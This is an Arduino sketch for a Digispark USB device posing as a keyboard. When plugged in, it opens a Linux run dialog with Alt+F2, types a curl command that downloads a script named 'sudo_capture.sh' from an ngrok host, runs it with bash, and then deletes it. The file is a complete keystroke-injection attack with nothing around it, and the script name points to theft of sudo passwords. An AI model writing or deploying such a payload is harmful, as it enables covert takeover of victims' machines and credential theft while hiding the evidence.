#include "DigiKeyboard.h"

void setup(){
DigiKeyboard.update();
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.println("curl https://90d9d99a.ngrok.io/sudo_capture.sh -o payload.sh");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.println("bash payload.sh");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.println("rm payload.sh");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop()

{

}

